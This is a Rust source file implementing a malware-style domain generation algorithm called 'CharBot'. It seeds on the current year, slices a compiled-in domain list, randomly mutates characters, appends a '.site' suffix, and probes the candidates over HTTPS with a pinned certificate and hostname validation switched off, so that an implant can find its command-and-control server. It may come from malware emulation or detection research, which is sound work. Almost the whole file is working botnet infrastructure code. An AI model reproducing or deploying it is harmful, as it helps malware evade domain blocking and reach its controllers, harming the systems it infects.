use chrono::Utc;
use chrono::{self, Datelike};
use rand::prelude::*;
use std::net::ToSocketAddrs;
use std::{concat, env, include};

use crate::CERT;

include!("../comptime_prod/domains.rs");

const DOMAIN_CHARS: &'static [&'static str] = &[
    "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s",
    "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
];

#[derive(Debug)]
pub struct CharBot {
    gen_amount: u32,
    tlds: Vec<&'static str>,
    mutations: u32,
}

pub trait Dga {
    fn verify_domains(&self, domains: &Vec<String>) -> Option<String> {
        let cert = reqwest::Certificate::from_pem(CERT).unwrap();
        let client = reqwest::blocking::ClientBuilder::new()
            .add_root_certificate(cert)
            .https_only(true)
            .danger_accept_invalid_hostnames(true)
            .tls_built_in_root_certs(false)
            .build()
            .unwrap();

        for domain in domains {
            if let Ok(mut result) = format!("{}:443", domain).to_socket_addrs() {
                if let Some(_entry) = result.next() {
                    if let Ok(_res) = client.get(format!("https://{}", domain)).send() {
                        return Some(domain.to_string());
                    }
                }
            }
        }

        None
    }

    fn get_domain(&self) -> Option<String>;
}

impl CharBot {
    fn gen_domains(&self) -> Vec<String> {
        let current_date = Utc::now();
        let seed = current_date.year_ce().1 * 12;

        let offset = ((seed ^ 73492) % ((DOMAINS.len() as u32 - 1) - self.gen_amount)) as usize;

        let mut current_domains: Vec<String> = DOMAINS[offset..offset + self.gen_amount as usize]
            .iter()
            .map(|str| str.to_string())
            .collect();

        current_domains.iter_mut().for_each(|domain| {
            let parts: Vec<&str> = domain.split(".").collect();
            *domain = parts
                .iter()
                .take(parts.len() - 1)
                .map(|str| str.to_string())
                .collect::<Vec<String>>()
                .join("")
        });

        let mut rng = rand::thread_rng();
        current_domains.iter_mut().for_each(|domain| {
            (0..self.mutations).for_each(|_| {
                let mchar: usize = rng.gen_range(0..domain.len());
                let random_char = DOMAIN_CHARS[rng.gen_range(0..DOMAIN_CHARS.len())];
                domain.replace_range(mchar..=mchar, random_char);
            });
        });

        let mut domains = vec![];
        for domain in &current_domains {
            for tld in &self.tlds {
                domains.push(format!("{}.{}", domain, tld));
            }
        }

        domains
    }
}

impl Dga for CharBot {
    fn get_domain(&self) -> Option<String> {
        let domains = self.gen_domains();
        self.verify_domains(&domains)
    }
}

impl Default for CharBot {
    fn default() -> Self {
        Self {
            gen_amount: 1000,
            mutations: 2,
            tlds: vec!["site"],
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
}
